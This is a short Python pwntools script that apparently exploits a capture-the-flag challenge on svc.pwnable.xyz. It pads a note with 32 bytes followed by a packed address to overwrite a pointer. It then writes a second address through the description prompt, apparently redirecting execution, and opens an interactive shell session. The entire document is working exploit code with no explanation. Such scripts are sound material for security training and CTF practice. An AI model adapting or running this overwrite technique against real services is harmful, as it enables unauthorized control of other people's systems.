#!/usr/bin/python 
from pwn import *

p = remote("svc.pwnable.xyz", 30016)

p.sendafter("> ", '1')
p.sendafter("Note len? ", '100')

p.sendafter("note: ", 'A'*0x20 + p64(0x601210))

p.sendafter("> ", '2')
p.sendafter("desc: ", p64(0x40093c))
p.sendafter("> ", '1')
p.sendafter("Note len? ", '5')
p.sendafter("note: ", 'A'*5)

p.interactive()
